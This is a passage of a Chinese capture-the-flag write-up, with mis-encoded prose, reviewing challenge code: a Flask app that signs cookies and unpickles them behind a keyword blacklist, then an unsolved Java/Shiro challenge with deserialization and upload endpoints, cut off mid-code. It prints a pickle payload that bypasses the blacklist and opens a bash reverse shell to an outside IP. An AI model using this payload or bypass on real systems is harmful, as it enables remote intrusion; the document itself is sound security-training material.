boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">tob</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">unicode</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_cookie</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    value <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">if</span> secret <span class="token keyword">and</span> value<span class="token punctuation">:</span>        dec <span class="token operator">=</span> cookie_decode<span class="token punctuation">(</span>value<span class="token punctuation">,</span> secret<span class="token punctuation">)</span>        <span class="token keyword">return</span> dec<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> dec <span class="token keyword">and</span> dec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> key <span class="token keyword">else</span> default    <span class="token keyword">return</span> value <span class="token keyword">or</span> default<span class="token keyword">def</span> <span class="token function">cookie_is_encoded</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_lscmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token keyword">not</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token keyword">if</span> x <span class="token operator">==</span> y <span class="token keyword">else</span> <span class="token number">1</span> <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_cookie</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> secret<span class="token punctuation">:</span>        value <span class="token operator">=</span> touni<span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> max_age<span class="token operator">=</span><span class="token number">3600</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> resp    <span class="token keyword">elif</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token builtin">basestring</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> TypeError<span class="token punctuation">(</span><span class="token string">'Secret key missing for non-string Cookie.'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">4096</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">'Cookie value to long.'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">touni</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">,</span> err<span class="token operator">=</span><span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>enc<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;usr&#x2F;etc&#x2F;app&#x2F;config&#x2F;secret_key.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">secret_code <span class="token operator">=</span> <span class="token string">"EnjoyThePlayTime123456"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå¼€å§‹å®¡ä»£ç ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">invalid <span class="token operator">=</span> cookie_check<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span><span class="token keyword">if</span> invalid<span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Nope, invalid code get out!"</span>data <span class="token operator">=</span> get_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·Ÿè¿›<code>cookie_check</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word <span class="token keyword">in</span> data<span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token keyword">def</span> <span class="token function">cookie_check</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">:</span>        <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>                <span class="token keyword">if</span> waf<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">True</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>banäº†RæŒ‡ä»¤ï¼Œç”¨oæŒ‡ä»¤éšä¾¿ç»•ï¼Œç„¶åå®¡è®¡ä¸€åœˆä¸‹æ¥å¯çŸ¥ä¸‹é¢çš„<code>cookie_check</code>ç”¨äºæ£€æµ‹æ˜¯å¦æ˜¯<code>set_cookie</code>äº§ç”Ÿçš„cookie</p><p>é‚£å°±ä¾æ ·ç”»è‘«èŠ¦ç”Ÿæˆä¸€ä¸ª</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> cookie <span class="token keyword">import</span> cookie_encode<span class="token keyword">from</span> config<span class="token punctuation">.</span>secret_key <span class="token keyword">import</span> secret_codeopcode<span class="token operator">=</span><span class="token triple-quoted-string string">b'''(cossystemS'bash -c "bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1"'o.'''</span>a<span class="token operator">=</span>opcode<span class="token keyword">print</span><span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span>opcode<span class="token punctuation">)</span><span class="token punctuation">,</span>secret_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆçš„ cookie ç›´æ¥ä¼ å…¥ &#x2F;board è·¯ç”±å¼¹shell</p><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240827112051806.png" alt="image-20240827112051806"></p><hr><h1 id="ez-javaï¼ˆUnsolvedï¼‰"><a href="#ez-javaï¼ˆUnsolvedï¼‰" class="headerlink" title="ez_javaï¼ˆUnsolvedï¼‰"></a>ez_javaï¼ˆUnsolvedï¼‰</h1><p>å®¡å®¡ä»£ç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span></span><span class="token class-name">SecurityUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>authc<span class="token punctuation">.</span></span><span class="token class-name">AuthenticationException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>authc<span class="token punctuation">.</span></span><span class="token class-name">UsernamePasswordToken</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span></span><span class="token class-name">Subject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexControler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">IndexControler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/doLogin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">createSql</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Subject</span> subject <span class="token operator">=</span> <span class="token class-name">SecurityUtils</span><span class="token punctuation">.</span><span class="token function">getSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            subject<span class="token punctuation">.</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UsernamePasswordToken</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"forward:/user/index"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">AuthenticationException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"forward:/login"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/wrong"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"wrong"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/login"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"login"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç™»å½•æ¥å£</p><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240828084825553.png" alt="image-20240828084825553"></p><p>è¿™é‡Œç»™äº†è´¦å¯†å¯ä»¥ç™»å½•è¿›å»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ycbjava<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">MyObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">OpenOption</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>multipart<span class="token punctuation">.</span></span><span class="token class-name">MultipartFile</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserControler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">UserControler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/user/index"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/user/ser"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">ser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"ser"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> ser<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>ser<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">MyObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/user/upload"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">handleFileUpload</span><span class="token punctuation">(</span><span class="token class-name">MultipartFile</span> file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> fileName <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> index <span class="token operator">=</span> fileName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fileName<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>fileName<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"..\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">String</span> suffix <span class="token operator">=</span> fileName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">".jsp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token class-name">Path</span> path <span class="token operator">=</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/templates/"</span> <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">OpenOption</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token string">"File upload success"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var7<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token 